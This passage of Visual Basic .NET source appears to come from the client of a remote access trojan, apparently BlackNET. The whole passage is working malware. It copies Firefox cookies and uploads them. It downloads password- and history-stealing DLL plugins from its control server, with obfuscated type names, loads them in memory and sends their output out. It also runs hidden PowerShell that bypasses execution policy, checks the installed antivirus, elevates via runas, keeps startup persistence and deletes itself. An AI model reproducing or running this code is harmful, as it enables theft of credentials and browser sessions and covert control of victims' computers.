                    Next

                    C.Log("Succ", "File Has been uploaded")
                End If
                Return True
            Catch ex As Exception
                Debug(ex.Message)
                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                Return ex.Message
            End Try
        Catch ex As Exception
            Debug(ex.Message)
            Return False
        End Try
    End Function

    Public Function StealFFCookies()
        Try

            Dim profiles_path As String = Path.Combine(Environ("Appdata"), Path.Combine(Path.Combine("Mozilla", "Firefox"), "Profiles"))
            Dim directories As String() = Directory.GetDirectories(profiles_path)

            For Each dir As String In directories
                Dim profile_name As String = dir.Replace(profiles_path & "\", String.Empty)
                Dim isExist As Boolean = File.Exists(Path.Combine(Path.Combine(profiles_path, profile_name), "cookies.sqlite"))

                If isExist Then
                    Dim myFile As Long = New FileInfo(Path.Combine(Path.Combine(profiles_path, profile_name), "cookies.sqlite")).Length
                    If myFile > 0 Then
                        File.Copy(Path.Combine(Path.Combine(profiles_path, profile_name), "cookies.sqlite"), Path.Combine(Path.GetTempPath, "cookies.sqlite"), True)
                        Exit For
                    End If
                End If
            Next

            If File.Exists(Path.Combine(Path.GetTempPath, "cookies.sqlite")) Then
                C.Upload(Path.Combine(Path.GetTempPath, "cookies.sqlite"))

                C.Log("Succ", "Firefox Cookies has been uploaded")
            Else
                C.Log("Fail", "Client does not have cookies")
            End If

            Return True
        Catch ex As Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
            Return False
        End Try
    End Function
    Public Function PowerShell(ByVal TempName As String)
        Try
            Dim si As New ProcessStartInfo
            With si
                .FileName = "powershell"
                .Arguments = "–ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File " + """" + TempName + """"
                .CreateNoWindow = True
                .WindowStyle = ProcessWindowStyle.Hidden
            End With
            Process.Start(si)
            Return True
        Catch ex As System.ComponentModel.Win32Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
            Return False
        End Try
    End Function
    Public Function TempCleaner(ByVal filelist() As String)
        Try
            For Each filename As String In filelist
                If IO.File.Exists(Path.Combine(TempPath, filename)) Then
                    IO.File.Delete(Path.Combine(TempPath, filename))
                End If
            Next
            Return True
        Catch ex As Exception
            Debug(ex.Message)
            Return False
        End Try
    End Function
    Public Function checkUSB()
        If File.Exists(Path.Combine(TempPath, "BlackNET.dat")) And Application.ExecutablePath.EndsWith("windows_update.exe") Then
            Return "yes"
        Else
            Return "no"
        End If
    End Function
    Public Function GetLocation() As String
        Dim res As String = Assembly.GetExecutingAssembly().Location
        If res = "" OrElse res Is Nothing Then
            res = Assembly.GetEntryAssembly().Location
        End If
        Return res
    End Function
    Public Sub SelfDestroy()
        Try
            Dim si As ProcessStartInfo = New ProcessStartInfo()
            With si
                .FileName = "cmd.exe"
                .Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del """ & GetLocation() & """"
                .CreateNoWindow = True
                .WindowStyle = ProcessWindowStyle.Hidden
            End With
            Process.Start(si)
        Catch ex As Exception
            Debug(ex.Message)
        End Try
    End Sub

    Public Function Uninstall(ByVal RunSelfDestroy As Boolean, ByVal RestartMe As Boolean)
        Try
            C.Send("Uninstall")

            Dim filelist() As String = {"ProgramList.txt", C.ENB(ID & "_" & HWD()) & ".png", "CookiesCh.sqlite", "cookies.sqlite", "Passwords.txt", "Token.txt", "History.txt", s & ".txt"}
            TempCleaner(filelist)

            If (Startup = True) Then
                DStartup(StartName)
            End If
            If WatcherStatus = True Then
                Watchdog.KeepRunning = False
                Watchdog.StopWatcher(True)
            End If
            If RunSelfDestroy = True Then
                SelfDestroy()
            End If
            If RestartMe = True Then
                Application.Restart()
            Else
                Application.Exit()
            End If
            Return True
        Catch ex As Exception
            Debug(ex.Message)
            Return False
        End Try
    End Function
    Public Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function
    Public Sub OpenWebHidden(Url As String)
        Try
            HiddenBrowser.ScriptErrorsSuppressed = True
            HiddenBrowser.Navigate(Url)
            C.Log("Succ", "Webpage has been opened in hidden mode")
        Catch ex As Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
        End Try
    End Sub
    Public Function checkadmin() As String
        Dim W_Id = WindowsIdentity.GetCurrent()
        Dim WP = New WindowsPrincipal(W_Id)
        Dim isAdmin As Boolean = WP.IsInRole(WindowsBuiltInRole.Administrator)
        If isAdmin = True Then
            Return "Administrator"
        Else
            Return "User"
        End If
    End Function
    Public Function StealPasswords()
        Try
            If Not (File.Exists(Path.Combine(Application.StartupPath, "Newtonsoft.Json.dll"))) Then
                C.DownloadFile(C.Host & "/plugins/Newtonsoft.Json.dll", Path.Combine(Application.StartupPath, "Newtonsoft.Json.dll"))
                File.SetAttributes(Path.Combine(Application.StartupPath, "Newtonsoft.Json.dll"), FileAttributes.Hidden)
            End If

            Dim PluginData As Byte() = C.DownloadData(C.Host & "/plugins/PasswordStealer.dll")

            If (LoadDLL(PluginData, C.DEB("UGFzc3dvcmRTdGVhbGVyLlN0ZWFsZXI"), C.DEB("UnVu")) = True) Then
                If (C.Upload(Path.Combine(TempPath, "Passwords.txt"))) Then
                    C.Log("Succ", "Password Stealer has been executed")
                Else
                    C.Log("Fail", "Socket failed in uploading the txt file")
                End If
            Else
                C.Log("Fail", "Password Stelaer failed in collecting passwords")
            End If

            Return True
        Catch ex As Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
            Return ex.Message
        End Try
    End Function

    Public Function StealHistory()
        Try
            Dim PluginData As Byte() = C.DownloadData(C.Host & "/plugins/HistoryStealer.dll")

            If (LoadDLL(PluginData, C.DEB("SGlzdG9yeVN0ZWFsZXIuU3RlYWxlcg"), C.DEB("UnVu")) = True) Then
                If (C.Upload(Path.Combine(TempPath, "History.txt"))) Then
                    C.Log("Succ", "History Stealer has been executed")
                End If
            Else
                C.Log("Fail", "History Stealer failed in collecting data")
            End If
            Return True
        Catch ex As Exception
            Debug(ex.Message)
            C.Log("Fail", "An unexpected error occurred " & ex.Message)
            Return ex.Message
        End Try
    End Function

    Public Function CustomPlugin(ByVal PluginBytes As Byte(), ByVal typeName As String, ByVal methodName As String, ByVal hasOutput As String, Optional ByVal ext As String = "txt")
        Try
            If hasOutput = "True" Then
                If (File.Exists(Path.Combine(TempPath, "PluginOutput." & ext))) Then
                    File.Delete(Path.Combine(TempPath, "PluginOutput." & ext))
                End If

                IO.File.WriteAllText(Path.Combine(TempPath, "PluginOutput." & ext), LoadDLL(PluginBytes, typeName, methodName))

                C.Upload(Path.Combine(TempPath, "PluginOutput." & ext))
                Return True
            Else
                Return LoadDLL(PluginBytes, typeName, methodName)
            End If
        Catch ex As Exception
            Debug(ex.Message)
            Return ex.Message
        End Try
    End Function
    Public Function LoadDLL(ByVal PluginBytes As Byte(), ByVal typeName As String, ByVal methodName As String, Optional ByVal hasParamters As Boolean = False, Optional ByVal paramter() As Object = Nothing)
        Try
            Dim p = Reflection.Assembly.Load(PluginBytes)

            Dim ci = p.CreateInstance(typeName)

            If hasParamters = True Then
                ci.paramters = paramter
            End If

            Dim obj As Object = CallByName(ci, methodName, CallType.Method)

            Return obj
        Catch ex As Exception
            Debug(ex.Message)
            Return ex.Message
        End Try
    End Function
    Function GetAntiVirus() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str.ToString()
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function
    Private Sub RestartElevated()
        If checkadmin() = "Administrator" Then
            C.Log("Fail", "Client is already admin")
        Else
            Try
                Dim startInfo As New ProcessStartInfo()
                With startInfo
                    .UseShellExecute = True
                    .WorkingDirectory = Environment.CurrentDirectory
                    .FileName = Application.ExecutablePath
                    .Verb = "runas"
                End With
                C.Send("CleanCommands")
                C.Log("Succ", "Client has been elevated to admin")
                Dim p As Process = Process.Start(startInfo)
                End
            Catch ex As System.ComponentModel.Win32Exception
                Debug(ex.Message)
                C.Log("Fail", "An unexpected error occurred " & ex.Message)
                C.Send("CleanCommands")
                Return
            End Try
        End If
    End Sub
    Public Function ProgramList()
        Try
            Dim TextBox2 As New TextBox
            Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
            For Each text As String In Directory.GetDirectories(folderPath)
                Dim text2 As String = text.Substring(text.LastIndexOf("\")).Replace("\", String.Empty) & vbCrLf
                TextBox2.AppendText(text2)
                File.WriteAllText(Path.Combine(TempPath, "ProgramList.txt"), TextBox2.Text)
            Next
            Return True
        Catch ex As Exception
            Debug(ex.Message)
            Return False
        End Try
    End Function
    Public Function Randomisi(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "•¥µ☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي~!@#$%^&*()+-/><".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Private Function CompDir(ByVal F1 As IO.FileInfo, ByVal F2 As IO.FileInfo) As Boolean ' Compare 2 path
        If F1.Name.ToLower <> F2.Name.ToLower Then Return False
        Dim D1 = F1.Directory
        Dim D2 = F2.Directory
re:
        If D1.Name.ToLower = D2.Name.ToLower = False Then Return False
        D1 = D1.Parent
        D2 = D2.Parent
        If D1 Is Nothing And D2 Is Nothing Then Return True
        If D1 Is Nothing Then Return False
        If D2 Is Nothing Then Return False
        GoTo re
    End Function
    Public Sub StartWork(ByVal x As Boolean)
        Do While x = True
            AStartup(StartName, Application.ExecutablePath)
        Loop
    End Sub
End Class
